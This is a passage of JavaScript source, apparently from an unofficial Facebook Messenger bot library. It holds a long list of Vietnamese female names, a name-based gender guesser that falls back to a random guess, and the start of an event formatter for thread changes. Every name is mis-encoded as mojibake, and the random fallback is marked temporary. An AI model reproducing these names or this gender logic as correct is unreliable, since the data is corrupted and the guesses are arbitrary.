H·∫°nh\",\n    \"M·ªπ Khuy√™n\",\n    \"M·ªπ Ki·ªÅu\",\n    \"M·ªπ Lan\",\n    \"M·ªπ Loan\",\n    \"M·ªπ L·ªá\",\n    \"M·ªπ L·ª£i\",\n    \"M·ªπ Nga\",\n    \"M·ªπ Ng·ªçc\",\n    \"M·ªπ Nhi\",\n    \"M·ªπ Nh√¢n\",\n    \"M·ªπ N∆∞∆°ng\",\n    \"M·ªπ Ph∆∞∆°ng\",\n    \"M·ªπ Ph∆∞·ª£ng\",\n    \"M·ªπ Ph·ª•ng\",\n    \"M·ªπ Thu·∫ßn\",\n    \"M·ªπ Thu·∫≠n\",\n    \"M·ªπ Trang\",\n    \"M·ªπ Tr√¢m\",\n    \"M·ªπ T√¢m\",\n    \"M·ªπ Uy√™n\",\n    \"M·ªπ V√¢n\",\n    \"M·ªπ Xu√¢n\",\n    \"M·ªπ Y·∫øn\",\n    \"Nghi Dung\",\n    \"Nghi Minh\",\n    \"Nghi Xu√¢n\",\n    \"Nguy√™n H·ªìng\",\n    \"Nguy√™n Th·∫£o\",\n    \"Nguy·∫øt √Ånh\",\n    \"Nguy·ªát Anh\",\n    \"Nguy·ªát C√°t\",\n    \"Nguy·ªát C·∫ßm\",\n    \"Nguy·ªát H√†\",\n    \"Nguy·ªát H·ªìng\",\n    \"Nguy·ªát Lan\",\n    \"Nguy·ªát Minh\",\n    \"Nguy·ªát Nga\",\n    \"Nguy·ªát Qu·∫ø\",\n    \"Nguy·ªát Uy·ªÉn\",\n    \"Nguy·ªát √Ånh\",\n    \"Ng√¢n Anh\",\n    \"Ng√¢n H√†\",\n    \"Ng√¢n Thanh\",\n    \"Ng√¢n Tr√∫c\",\n    \"Ng·ªçc Anh\",\n    \"Ng·ªçc B√≠ch\",\n    \"Ng·ªçc C·∫ßm\",\n    \"Ng·ªçc Di·ªáp\",\n    \"Ng·ªçc Dung\",\n    \"Ng·ªçc Hi·ªÅn\",\n    \"Ng·ªçc Hoa\",\n    \"Ng·ªçc Hoan\",\n    \"Ng·ªçc Ho√†n\",\n    \"Ng·ªçc Huy·ªÅn\",\n    \"Ng·ªçc Hu·ªá\",\n    \"Ng·ªçc H√†\",\n    \"Ng·ªçc H√¢n\",\n    \"Ng·ªçc H·∫°\",\n    \"Ng·ªçc H·∫°nh\",\n    \"Ng·ªçc H·∫±ng\",\n    \"Ng·ªçc Khanh\",\n    \"Ng·ªçc Khu√™\",\n    \"Ng·ªçc Kh√°nh\",\n    \"Ng·ªçc Lam\",\n    \"Ng·ªçc Lan\",\n    \"Ng·ªçc Linh\",\n    \"Ng·ªçc Li√™n\",\n    \"Ng·ªçc Loan\",\n    \"Ng·ªçc Ly\",\n    \"Ng·ªçc L√¢m\",\n    \"Ng·ªçc L√Ω\",\n    \"Ng·ªçc L·ªá\",\n    \"Ng·ªçc Mai\",\n    \"Ng·ªçc Nhi\",\n    \"Ng·ªçc N·ªØ\",\n    \"Ng·ªçc Oanh\",\n    \"Ng·ªçc Ph·ª•ng\",\n    \"Ng·ªçc Quy√™n\",\n    \"Ng·ªçc Qu·∫ø\",\n    \"Ng·ªçc Qu·ª≥nh\",\n    \"Ng·ªçc San\",\n    \"Ng·ªçc S∆∞∆°ng\",\n    \"Ng·ªçc Thi\",\n    \"Ng·ªçc Thy\",\n    \"Ng·ªçc Th∆°\",\n    \"Ng·ªçc Trinh\",\n    \"Ng·ªçc Tr√¢m\",\n    \"Ng·ªçc Tuy·∫øt\",\n    \"Ng·ªçc T√¢m\",\n    \"Ng·ªçc T√∫\",\n    \"Ng·ªçc Uy√™n\",\n    \"Ng·ªçc Uy·ªÉn\",\n    \"Ng·ªçc Vy\",\n    \"Ng·ªçc V√¢n\",\n    \"Ng·ªçc Y·∫øn\",\n    \"Ng·ªçc √Åi\",\n    \"Ng·ªçc √Ånh\",\n    \"Ng·ªçc √êi·ªáp\",\n    \"Ng·ªçc √ê√†n\",\n    \"Ng·ªçc √ê√†o\",\n    \"Nhan H·ªìng\",\n    \"Nh√£ H∆∞∆°ng\",\n    \"Nh√£ H·ªìng\",\n    \"Nh√£ Khanh\",\n    \"Nh√£ L√Ω\",\n    \"Nh√£ Mai\",\n    \"Nh√£ S∆∞∆°ng\",\n    \"Nh√£ Thanh\",\n    \"Nh√£ Trang\",\n    \"Nh√£ Tr√∫c\",\n    \"Nh√£ Uy√™n\",\n    \"Nh√£ Y·∫øn\",\n    \"Nh√£ √ù\",\n    \"Nh∆∞ Anh\",\n    \"Nh∆∞ B·∫£o\",\n    \"Nh∆∞ Hoa\",\n    \"Nh∆∞ H·∫£o\",\n    \"Nh∆∞ H·ªìng\",\n    \"Nh∆∞ Loan\",\n    \"Nh∆∞ Mai\",\n    \"Nh∆∞ Ng√†\",\n    \"Nh∆∞ Ng·ªçc\",\n    \"Nh∆∞ Ph∆∞∆°ng\",\n    \"Nh∆∞ Qu√¢n\",\n    \"Nh∆∞ Qu·ª≥nh\",\n    \"Nh∆∞ Th·∫£o\",\n    \"Nh∆∞ Tr√¢n\",\n    \"Nh∆∞ T√¢m\",\n    \"Nh∆∞ √ù\",\n    \"Nh·∫•t Th∆∞∆°ng\",\n    \"Nh·∫≠t D·∫°\",\n    \"Nh·∫≠t H√†\",\n    \"Nh·∫≠t H·∫°\",\n    \"Nh·∫≠t Lan\",\n    \"Nh·∫≠t Linh\",\n    \"Nh·∫≠t L·ªá\",\n    \"Nh·∫≠t Mai\",\n    \"Nh·∫≠t Ph∆∞∆°ng\",\n    \"Nh·∫≠t √Ånh\",\n    \"Oanh Th∆°\",\n    \"Oanh V≈©\",\n    \"Phi Khanh\",\n    \"Phi Nhung\",\n    \"Phi Nh·∫°n\",\n    \"Phi Phi\",\n    \"Phi Ph∆∞·ª£ng\",\n    \"Phong Lan\",\n    \"Ph∆∞∆°ng An\",\n    \"Ph∆∞∆°ng Anh\",\n    \"Ph∆∞∆°ng Chi\",\n    \"Ph∆∞∆°ng Ch√¢u\",\n    \"Ph∆∞∆°ng Di·ªÖm\",\n    \"Ph∆∞∆°ng Dung\",\n    \"Ph∆∞∆°ng Giang\",\n    \"Ph∆∞∆°ng Hi·ªÅn\",\n    \"Ph∆∞∆°ng Hoa\",\n    \"Ph∆∞∆°ng H·∫°nh\",\n    \"Ph∆∞∆°ng Lan\",\n    \"Ph∆∞∆°ng Linh\",\n    \"Ph∆∞∆°ng Li√™n\",\n    \"Ph∆∞∆°ng Loan\",\n    \"Ph∆∞∆°ng Mai\",\n    \"Ph∆∞∆°ng Nghi\",\n    \"Ph∆∞∆°ng Ng·ªçc\",\n    \"Ph∆∞∆°ng Nhi\",\n    \"Ph∆∞∆°ng Nhung\",\n    \"Ph∆∞∆°ng Ph∆∞∆°ng\",\n    \"Ph∆∞∆°ng Quy√™n\",\n    \"Ph∆∞∆°ng Qu√¢n\",\n    \"Ph∆∞∆°ng Qu·∫ø\",\n    \"Ph∆∞∆°ng Qu·ª≥nh\",\n    \"Ph∆∞∆°ng Thanh\",\n    \"Ph∆∞∆°ng Thi\",\n    \"Ph∆∞∆°ng Th√πy\",\n    \"Ph∆∞∆°ng Th·∫£o\",\n    \"Ph∆∞∆°ng Th·ªßy\",\n    \"Ph∆∞∆°ng Trang\",\n    \"Ph∆∞∆°ng Trinh\",\n    \"Ph∆∞∆°ng Tr√†\",\n    \"Ph∆∞∆°ng Tr√¢m\",\n    \"Ph∆∞∆°ng T√¢m\",\n    \"Ph∆∞∆°ng Uy√™n\",\n    \"Ph∆∞∆°ng Y·∫øn\",\n    \"Ph∆∞·ªõc B√¨nh\",\n    \"Ph∆∞·ªõc Hu·ªá\",\n    \"Ph∆∞·ª£ng B√≠ch\",\n    \"Ph∆∞·ª£ng Li√™n\",\n    \"Ph∆∞·ª£ng Loan\",\n    \"Ph∆∞·ª£ng L·ªá\",\n    \"Ph∆∞·ª£ng Nga\",\n    \"Ph∆∞·ª£ng Nhi\",\n    \"Ph∆∞·ª£ng Ti√™n\",\n    \"Ph∆∞·ª£ng Uy√™n\",\n    \"Ph∆∞·ª£ng Vy\",\n    \"Ph∆∞·ª£ng V≈©\",\n    \"Ph·ª•ng Y·∫øn\",\n    \"Qu·∫ø Anh\",\n    \"Qu·∫ø Chi\",\n    \"Qu·∫ø Linh\",\n    \"Qu·∫ø L√¢m\",\n    \"Qu·∫ø Ph∆∞∆°ng\",\n    \"Qu·∫ø Thu\",\n    \"Qu·ª≥nh Anh\",\n    \"Qu·ª≥nh Chi\",\n    \"Qu·ª≥nh Dao\",\n    \"Qu·ª≥nh Dung\",\n    \"Qu·ª≥nh Giang\",\n    \"Qu·ª≥nh Giao\",\n    \"Qu·ª≥nh Hoa\",\n    \"Qu·ª≥nh H√†\",\n    \"Qu·ª≥nh H∆∞∆°ng\",\n    \"Qu·ª≥nh Lam\",\n    \"Qu·ª≥nh Li√™n\",\n    \"Qu·ª≥nh L√¢m\",\n    \"Qu·ª≥nh Nga\",\n    \"Qu·ª≥nh Ng√¢n\",\n    \"Qu·ª≥nh Nhi\",\n    \"Qu·ª≥nh Nhung\",\n    \"Qu·ª≥nh Nh∆∞\",\n    \"Qu·ª≥nh Ph∆∞∆°ng\",\n    \"Qu·ª≥nh Sa\",\n    \"Qu·ª≥nh Thanh\",\n    \"Qu·ª≥nh Th∆°\",\n    \"Qu·ª≥nh Ti√™n\",\n    \"Qu·ª≥nh Trang\",\n    \"Qu·ª≥nh Tr√¢m\",\n    \"Qu·ª≥nh V√¢n\",\n    \"Sao BƒÉng\",\n    \"Sao Mai\",\n    \"Song K√™\",\n    \"Song Lam\",\n    \"Song Oanh\",\n    \"Song Th∆∞\",\n    \"S√¥ng H√†\",\n    \"S√¥ng H∆∞∆°ng\",\n    \"S∆°n Ca\",\n    \"S∆°n Tuy·ªÅn\",\n    \"S∆∞∆°ng S∆∞∆°ng\",\n    \"Thanh B√¨nh\",\n    \"Thanh D√¢n\",\n    \"Thanh Giang\",\n    \"Thanh Hi·∫øu\",\n    \"Thanh Hi·ªÅn\",\n    \"Thanh Hoa\",\n    \"Thanh Huy·ªÅn\",\n    \"Thanh H√†\",\n    \"Thanh H∆∞∆°ng\",\n    \"Thanh H∆∞·ªùng\",\n    \"Thanh H·∫°nh\",\n    \"Thanh H·∫£o\",\n    \"Thanh H·∫±ng\",\n    \"Thanh H·ªìng\",\n    \"Thanh Ki·ªÅu\",\n    \"Thanh Lam\",\n    \"Thanh Lan\",\n    \"Thanh Loan\",\n    \"Thanh L√¢m\",\n    \"Thanh Mai\",\n    \"Thanh M·∫´n\",\n    \"Thanh Nga\",\n    \"Thanh Nguy√™n\",\n    \"Thanh Ng√¢n\",\n    \"Thanh Ng·ªçc\",\n    \"Thanh Nhung\",\n    \"Thanh Nh√†n\",\n    \"Thanh Nh√£\",\n    \"Thanh Ph∆∞∆°ng\",\n    \"Thanh Thanh\",\n    \"Thanh Thi√™n\",\n    \"Thanh Thu\",\n    \"Thanh Th√∫y\",\n    \"Thanh Th∆∞\",\n    \"Thanh Th·∫£o\",\n    \"Thanh Th·ªßy\",\n    \"Thanh Trang\",\n    \"Thanh Tr√∫c\",\n    \"Thanh Tuy·∫øt\",\n    \"Thanh Tuy·ªÅn\",\n    \"Thanh T√¢m\",\n    \"Thanh Uy√™n\",\n    \"Thanh Vy\",\n    \"Thanh V√¢n\",\n    \"Thanh Xu√¢n\",\n    \"Thanh Y·∫øn\",\n    \"Thanh ƒêan\",\n    \"Thi C·∫ßm\",\n    \"Thi Ng√¥n\",\n    \"Thi Thi\",\n    \"Thi Xu√¢n\",\n    \"Thi Y·∫øn\",\n    \"Thi√™n Di\",\n    \"Thi√™n Duy√™n\",\n    \"Thi√™n Giang\",\n    \"Thi√™n H√†\",\n    \"Thi√™n H∆∞∆°ng\",\n    \"Thi√™n Kh√°nh\",\n    \"Thi√™n Kim\",\n    \"Thi√™n Lam\",\n    \"Thi√™n Lan\",\n    \"Thi√™n Mai\",\n    \"Thi√™n M·ªπ\",\n    \"Thi√™n Nga\",\n    \"Thi√™n N∆∞∆°ng\",\n    \"Thi√™n Ph∆∞∆°ng\",\n    \"Thi√™n Thanh\",\n    \"Thi√™n Th√™u\",\n    \"Thi√™n Th∆∞\",\n    \"Thi√™n Th·∫£o\",\n    \"Thi√™n Trang\",\n    \"Thi√™n Tuy·ªÅn\",\n    \"Thi·∫øu Mai\",\n    \"Thi·ªÅu Ly\",\n    \"Thi·ªán M·ªπ\",\n    \"Thi·ªán Ti√™n\",\n    \"Thu Duy√™n\",\n    \"Thu Giang\",\n    \"Thu Hi·ªÅn\",\n    \"Thu Ho√†i\",\n    \"Thu Huy·ªÅn\",\n    \"Thu Hu·ªá\",\n    \"Thu H√†\",\n    \"Thu H·∫≠u\",\n    \"Thu H·∫±ng\",\n    \"Thu H·ªìng\",\n    \"Thu Linh\",\n    \"Thu Li√™n\",\n    \"Thu Loan\",\n    \"Thu Mai\",\n    \"Thu Minh\",\n    \"Thu Nga\",\n    \"Thu Nguy·ªát\",\n    \"Thu Ng√†\",\n    \"Thu Ng√¢n\",\n    \"Thu Ng·ªçc\",\n    \"Thu Nhi√™n\",\n    \"Thu Oanh\",\n    \"Thu Phong\",\n    \"Thu Ph∆∞∆°ng\",\n    \"Thu Ph∆∞·ª£ng\",\n    \"Thu S∆∞∆°ng\",\n    \"Thu Thu·∫≠n\",\n    \"Thu Th·∫£o\",\n    \"Thu Th·ªßy\",\n    \"Thu Trang\",\n    \"Thu Vi·ªát\",\n    \"Thu V√¢n\",\n    \"Thu V·ªçng\",\n    \"Thu Y·∫øn\",\n    \"Thu·∫ßn H·∫≠u\",\n    \"Thy Khanh\",\n    \"Thy Oanh\",\n    \"Thy Tr√∫c\",\n    \"Thy V√¢n\",\n    \"Th√°i Chi\",\n    \"Th√°i H√†\",\n    \"Th√°i H·ªìng\",\n    \"Th√°i Lan\",\n    \"Th√°i L√¢m\",\n    \"Th√°i Thanh\",\n    \"Th√°i Th·∫£o\",\n    \"Th√°i T√¢m\",\n    \"Th√°i V√¢n\",\n    \"Th√πy Anh\",\n    \"Th√πy Dung\",\n    \"Th√πy D∆∞∆°ng\",\n    \"Th√πy Giang\",\n    \"Th√πy Linh\",\n    \"Th√πy Mi\",\n    \"Th√πy My\",\n    \"Th√πy Nhi\",\n    \"Th√πy Nh∆∞\",\n    \"Th√πy Oanh\",\n    \"Th√πy Uy√™n\",\n    \"Th√πy V√¢n\",\n    \"Th√∫y Anh\",\n    \"Th√∫y Di·ªÖm\",\n    \"Th√∫y Hi·ªÅn\",\n    \"Th√∫y Huy·ªÅn\",\n    \"Th√∫y H√†\",\n    \"Th√∫y H∆∞∆°ng\",\n    \"Th√∫y H∆∞·ªùng\",\n    \"Th√∫y H·∫°nh\",\n    \"Th√∫y H·∫±ng\",\n    \"Th√∫y Ki·ªÅu\",\n    \"Th√∫y Li√™n\",\n    \"Th√∫y Li·ªÖu\",\n    \"Th√∫y Loan\",\n    \"Th√∫y Mai\",\n    \"Th√∫y Minh\",\n    \"Th√∫y My\",\n    \"Th√∫y Nga\",\n    \"Th√∫y Ng√†\",\n    \"Th√∫y Ng√¢n\",\n    \"Th√∫y Ng·ªçc\",\n    \"Th√∫y Ph∆∞·ª£ng\",\n    \"Th√∫y Qu·ª≥nh\",\n    \"Th√∫y Vi\",\n    \"Th√∫y Vy\",\n    \"Th√∫y V√¢n\",\n    \"Th∆° Th∆°\",\n    \"Th∆∞ L√¢m\",\n    \"Th∆∞ S∆∞∆°ng\",\n    \"Th∆∞∆°ng Huy·ªÅn\",\n    \"Th∆∞∆°ng Nga\",\n    \"Th∆∞∆°ng Th∆∞∆°ng\",\n    \"Th∆∞·ªùng Xu√¢n\",\n    \"Th·∫°ch Th·∫£o\",\n    \"Th·∫£o H∆∞∆°ng\",\n    \"Th·∫£o H·ªìng\",\n    \"Th·∫£o Linh\",\n    \"Th·∫£o Ly\",\n    \"Th·∫£o Mai\",\n    \"Th·∫£o My\",\n    \"Th·∫£o Nghi\",\n    \"Th·∫£o Nguy√™n\",\n    \"Th·∫£o Nhi\",\n    \"Th·∫£o Quy√™n\",\n    \"Th·∫£o Ti√™n\",\n    \"Th·∫£o Trang\",\n    \"Th·∫£o Uy√™n\",\n    \"Th·∫£o Vy\",\n    \"Th·∫£o V√¢n\",\n    \"Th·ª•c Anh\",\n    \"Th·ª•c Khu√™\",\n    \"Th·ª•c Nhi\",\n    \"Th·ª•c Oanh\",\n    \"Th·ª•c Quy√™n\",\n    \"Th·ª•c Trang\",\n    \"Th·ª•c Trinh\",\n    \"Th·ª•c T√¢m\",\n    \"Th·ª•c Uy√™n\",\n    \"Th·ª•c V√¢n\",\n    \"Th·ª•c √êoan\",\n    \"Th·ª•c √ê√†o\",\n    \"Th·ª•c √ê√¨nh\",\n    \"Th·ª•y Du\",\n    \"Th·ª•y Khanh\",\n    \"Th·ª•y Linh\",\n    \"Th·ª•y L√¢m\",\n    \"Th·ª•y Mi√™n\",\n    \"Th·ª•y N∆∞∆°ng\",\n    \"Th·ª•y Trinh\",\n    \"Th·ª•y Tr√¢m\",\n    \"Th·ª•y Uy√™n\",\n    \"Th·ª•y V√¢n\",\n    \"Th·ª•y √ê√†o\",\n    \"Th·ªßy H·∫±ng\",\n    \"Th·ªßy H·ªìng\",\n    \"Th·ªßy Linh\",\n    \"Th·ªßy Minh\",\n    \"Th·ªßy Nguy·ªát\",\n    \"Th·ªßy Qu·ª≥nh\",\n    \"Th·ªßy Ti√™n\",\n    \"Th·ªßy Trang\",\n    \"Th·ªßy T√¢m\",\n    \"Tinh T√∫\",\n    \"Ti√™n Ph∆∞∆°ng\",\n    \"Ti·ªÉu Mi\",\n    \"Ti·ªÉu My\",\n    \"Ti·ªÉu Qu·ª≥nh\",\n    \"Trang Anh\",\n    \"Trang Linh\",\n    \"Trang Nh√£\",\n    \"Trang T√¢m\",\n    \"Trang √ê√†i\",\n    \"Tri·ªÅu Nguy·ªát\",\n    \"Tri·ªÅu Thanh\",\n    \"Tri·ªáu M·∫´n\",\n    \"Trung Anh\",\n    \"Tr√† Giang\",\n    \"Tr√† My\",\n    \"Tr√¢m Anh\",\n    \"Tr√¢m Oanh\",\n    \"Tr√¢n Ch√¢u\",\n    \"Tr√∫c Chi\",\n    \"Tr√∫c Lam\",\n    \"Tr√∫c Lan\",\n    \"Tr√∫c Linh\",\n    \"Tr√∫c Li√™n\",\n    \"Tr√∫c Loan\",\n    \"Tr√∫c Ly\",\n    \"Tr√∫c L√¢m\",\n    \"Tr√∫c Mai\",\n    \"Tr√∫c Ph∆∞∆°ng\",\n    \"Tr√∫c Qu√¢n\",\n    \"Tr√∫c Qu·ª≥nh\",\n    \"Tr√∫c Vy\",\n    \"Tr√∫c V√¢n\",\n    \"Tr√∫c √ê√†o\",\n    \"Tr√∫c ƒê√†o\",\n    \"Tr·∫ßm H∆∞∆°ng\",\n    \"Tuy·∫øt Anh\",\n    \"Tuy·∫øt BƒÉng\",\n    \"Tuy·∫øt Chi\",\n    \"Tuy·∫øt Hoa\",\n    \"Tuy·∫øt H√¢n\",\n    \"Tuy·∫øt H∆∞∆°ng\",\n    \"Tuy·∫øt H·ªìng\",\n    \"Tuy·∫øt Lan\",\n    \"Tuy·∫øt Loan\",\n    \"Tuy·∫øt L√¢m\",\n    \"Tuy·∫øt Mai\",\n    \"Tuy·∫øt Nga\",\n    \"Tuy·∫øt Nhi\",\n    \"Tuy·∫øt Nhung\",\n    \"Tuy·∫øt Oanh\",\n    \"Tuy·∫øt Thanh\",\n    \"Tuy·∫øt Trinh\",\n    \"Tuy·∫øt Tr·∫ßm\",\n    \"Tuy·∫øt T√¢m\",\n    \"Tuy·∫øt Vy\",\n    \"Tuy·∫øt V√¢n\",\n    \"Tuy·∫øt Xu√¢n\",\n    \"Tuy·ªÅn L√¢m\",\n    \"Tu·ªá L√¢m\",\n    \"Tu·ªá M·∫´n\",\n    \"Tu·ªá Nhi\",\n    \"T√¢m Hi·ªÅn\",\n    \"T√¢m H·∫°nh\",\n    \"T√¢m H·∫±ng\",\n    \"T√¢m Khanh\",\n    \"T√¢m Linh\",\n    \"T√¢m Nguy√™n\",\n    \"T√¢m Nguy·ªát\",\n    \"T√¢m Nhi\",\n    \"T√¢m Nh∆∞\",\n    \"T√¢m Thanh\",\n    \"T√¢m Trang\",\n    \"T√¢m √êoan\",\n    \"T√¢m ƒêan\",\n    \"T√πng Linh\",\n    \"T√πng L√¢m\",\n    \"T√πng Qu√¢n\",\n    \"T√πy Anh\",\n    \"T√πy Linh\",\n    \"T√∫ Anh\",\n    \"T√∫ Ly\",\n    \"T√∫ Nguy·ªát\",\n    \"T√∫ Quy√™n\",\n    \"T√∫ Qu·ª≥nh\",\n    \"T√∫ S∆∞∆°ng\",\n    \"T√∫ Trinh\",\n    \"T√∫ T√¢m\",\n    \"T√∫ Uy√™n\",\n    \"T√∫y Loan\",\n    \"T∆∞·ªùng Chinh\",\n    \"T∆∞·ªùng Vi\",\n    \"T∆∞·ªùng Vy\",\n    \"T∆∞·ªùng V√¢n\",\n    \"T·ªãnh L√¢m\",\n    \"T·ªãnh Nhi\",\n    \"T·ªãnh Nh∆∞\",\n    \"T·ªãnh T√¢m\",\n    \"T·ªãnh Y√™n\",\n    \"T·ªë Loan\",\n    \"T·ªë Nga\",\n    \"T·ªë Nhi\",\n    \"T·ªë Quy√™n\",\n    \"T·ªë T√¢m\",\n    \"T·ªë Uy√™n\",\n    \"T·ª´ Dung\",\n    \"T·ª´ √Çn\",\n    \"Uy√™n Minh\",\n    \"Uy√™n My\",\n    \"Uy√™n Nhi\",\n    \"Uy√™n Ph∆∞∆°ng\",\n    \"Uy√™n Thi\",\n    \"Uy√™n Thy\",\n    \"Uy√™n Th∆°\",\n    \"Uy√™n Tr√¢m\",\n    \"Uy√™n Vi\",\n    \"Uy·ªÉn Khanh\",\n    \"Uy·ªÉn My\",\n    \"Uy·ªÉn Nghi\",\n    \"Uy·ªÉn Nhi\",\n    \"Uy·ªÉn Nh√£\",\n    \"Uy·ªÉn Nh∆∞\",\n    \"Vi Quy√™n\",\n    \"Vinh Di·ªáu\",\n    \"Vi·ªát H√†\",\n    \"Vi·ªát H∆∞∆°ng\",\n    \"Vi·ªát Khu√™\",\n    \"Vi·ªát Mi\",\n    \"Vi·ªát Nga\",\n    \"Vi·ªát Nhi\",\n    \"Vi·ªát Thi\",\n    \"Vi·ªát Trinh\",\n    \"Vi·ªát Tuy·∫øt\",\n    \"Vi·ªát Y·∫øn\",\n    \"Vy Lam\",\n    \"Vy Lan\",\n    \"V√†ng Anh\",\n    \"V√†nh Khuy√™n\",\n    \"V√¢n Anh\",\n    \"V√¢n Chi\",\n    \"V√¢n Du\",\n    \"V√¢n H√†\",\n    \"V√¢n H∆∞∆°ng\",\n    \"V√¢n Khanh\",\n    \"V√¢n Kh√°nh\",\n    \"V√¢n Linh\",\n    \"V√¢n Ng·ªçc\",\n    \"V√¢n Nhi\",\n    \"V√¢n Phi\",\n    \"V√¢n Ph∆∞∆°ng\",\n    \"V√¢n Quy√™n\",\n    \"V√¢n Qu·ª≥nh\",\n    \"V√¢n Thanh\",\n    \"V√¢n Th√∫y\",\n    \"V√¢n Th∆∞·ªùng\",\n    \"V√¢n Ti√™n\",\n    \"V√¢n Trang\",\n    \"V√¢n Trinh\",\n    \"V≈© H·ªìng\",\n    \"Xuy·∫øn Chi\",\n    \"Xu√¢n B·∫£o\",\n    \"Xu√¢n Dung\",\n    \"Xu√¢n Hi·ªÅn\",\n    \"Xu√¢n Hoa\",\n    \"Xu√¢n H√¢n\",\n    \"Xu√¢n H∆∞∆°ng\",\n    \"Xu√¢n H·∫°nh\",\n    \"Xu√¢n Lan\",\n    \"Xu√¢n Linh\",\n    \"Xu√¢n Li·ªÖu\",\n    \"Xu√¢n Loan\",\n    \"Xu√¢n L√¢m\",\n    \"Xu√¢n Mai\",\n    \"Xu√¢n Nghi\",\n    \"Xu√¢n Ng·ªçc\",\n    \"Xu√¢n Nhi\",\n    \"Xu√¢n Nhi√™n\",\n    \"Xu√¢n N∆∞∆°ng\",\n    \"Xu√¢n Ph∆∞∆°ng\",\n    \"Xu√¢n Ph∆∞·ª£ng\",\n    \"Xu√¢n Thanh\",\n    \"Xu√¢n Thu\",\n    \"Xu√¢n Th·∫£o\",\n    \"Xu√¢n Th·ªßy\",\n    \"Xu√¢n Trang\",\n    \"Xu√¢n T√¢m\",\n    \"Xu√¢n Uy√™n\",\n    \"Xu√¢n V√¢n\",\n    \"Xu√¢n Y·∫øn\",\n    \"Xu√¢n xanh\",\n    \"Y√™n B·∫±ng\",\n    \"Y√™n Mai\",\n    \"Y√™n Nhi\",\n    \"Y√™n √êan\",\n    \"Y√™n ƒêan\",\n    \"Y·∫øn Anh\",\n    \"Y·∫øn H·ªìng\",\n    \"Y·∫øn Loan\",\n    \"Y·∫øn Mai\",\n    \"Y·∫øn My\",\n    \"Y·∫øn Nhi\",\n    \"Y·∫øn Oanh\",\n    \"Y·∫øn Ph∆∞∆°ng\",\n    \"Y·∫øn Ph∆∞·ª£ng\",\n    \"Y·∫øn Thanh\",\n    \"Y·∫øn Th·∫£o\",\n    \"Y·∫øn Trang\",\n    \"Y·∫øn Trinh\",\n    \"Y·∫øn Tr√¢m\",\n    \"Y·∫øn √êan\",\n    \"√Åi H·ªìng\",\n    \"√Åi Khanh\",\n    \"√Åi Linh\",\n    \"√Åi Nhi\",\n    \"√Åi Nh√¢n\",\n    \"√Åi Thi\",\n    \"√Åi Thy\",\n    \"√Åi V√¢n\",\n    \"√Ånh D∆∞∆°ng\",\n    \"√Ånh Hoa\",\n    \"√Ånh H·ªìng\",\n    \"√Ånh Linh\",\n    \"√Ånh L·ªá\",\n    \"√Ånh Mai\",\n    \"√Ånh Nguy·ªát\",\n    \"√Ånh Ng·ªçc\",\n    \"√Ånh Th∆°\",\n    \"√Ånh Trang\",\n    \"√Ånh Tuy·∫øt\",\n    \"√Ånh Xu√¢n\",\n    \"√êan Khanh\",\n    \"√êan Qu·ª≥nh\",\n    \"√êan Thu\",\n    \"√êinh H∆∞∆°ng\",\n    \"√êoan Thanh\",\n    \"√êoan Trang\",\n    \"√ê√†i Trang\",\n    \"√ê√¥ng Nghi\",\n    \"√ê√¥ng Nhi\",\n    \"√ê√¥ng Tr√†\",\n    \"√ê√¥ng Tuy·ªÅn\",\n    \"√ê√¥ng Vy\",\n    \"√ê√¥ng √ê√†o\",\n    \"√ê·ªìng Dao\",\n    \"√ù B√¨nh\",\n    \"√ù Lan\",\n    \"√ù Nhi\",\n    \"ƒêan Linh\",\n    \"ƒêan Qu·ª≥nh\",\n    \"ƒêan Thanh\",\n    \"ƒêan Thu\",\n    \"ƒêan Th∆∞\",\n    \"ƒêan T√¢m\",\n    \"ƒêinh H∆∞∆°ng\",\n    \"ƒêoan Thanh\",\n    \"ƒêoan Trang\",\n    \"ƒê√†i Trang\",\n    \"ƒê√¥ng Nghi\",\n    \"ƒê√¥ng Tr√†\",\n    \"ƒê√¥ng Tuy·ªÅn\",\n    \"ƒê√¥ng Vy\",\n    \"ƒê∆°n Thu·∫ßn\",\n    \"ƒê·ª©c H·∫°nh\",\n    \"·∫§u LƒÉng\"\n]\n    let OtherName = [\".\",\",\",\"/\",\"%\", \"&\",\"*\",\"-\",\"+\"];\n    try {\n        var Name;\n            if (name == \" \" || name == null) return \"UNKNOWN\";\n            switch (female_name.some(a => name.includes(a))) {\n                case true: {\n                    if (!OtherName.includes(name)) Name = \"FEMALE\";\n                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp üåö\n                }\n            break;\n                case false: {\n                    if (female_name.some(a => name.split(' ')[name.split(' ').length - 1] == a)) Name = \"FEMALE\";\n                    else if (!OtherName.includes(name) && !female_name.includes(name)) Name = \"MALE\";\n                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp üåö\n                }\n            break;\n        } \n    }\n    catch (e) {\n        return \"UNKNOWN\";\n    }\n    return Name || \"UNKNOWN\";\n}\n\n/**\n * @param {{ [x: string]: { [x: string]: { [x: string]: any; }; }; class: any; untypedData: any; name: any; addedParticipants: any; leftParticipantFbId: any; messageMetadata: { threadKey: { threadFbId: any; otherUserFbId: any; }; adminText: any; actorFbId: any; }; participants: any; }} m\n */\n\nfunction formatDeltaEvent(m) {\n    var { updateData,getData,hasData } = require('./Extra/ExtraGetThread');\n    var logMessageType;\n    var logMessageData;\n\nswitch (m.class) {\n    case \"AdminTextMessage\":\n        logMessageType = getAdminTextMessageType(m);\n            logMessageData = m.untypedData;\n        break;\n    case \"ThreadName\":\n        logMessageType = \"log:thread-name\";\n            logMessageData = { name: m.name };\n        break;\n    case \"ParticipantsAddedToGroupThread\":\n        logMessageType = \"log:subscribe\";\n            logMessageData = { addedParticipants: m.addedParticipants };\n        break;\n    case \"ParticipantLeftGroupThread\":\n        logMessageType = \"log:unsubscribe\";\n        logMessageData = { leftParticipantFbId: m.leftParticipantFbId };\n    break;\n    case \"UserLocation\": {\n        logMessageType = \"log:user-location\";\n        logMessageData = {\n            Image: m.attachments[0].mercury.extensible_attachment.story_attachment.media.image,\n            Location: m.attachments[0].mercury.extensible_attachment.story_attachment.target.location_title,\n            coordinates: m.attachments[0].mercury.extensible_attachment.story_attachment.target.coordinate,\n            url: m.attachments[0].mercury.extensible_attachment.story_attachment.url\n        };\n    }\n}\nswitch (hasData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()))) {\n    case true: {\n        switch (logMessageType) {\n            case \"log:thread-color\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.emoji = 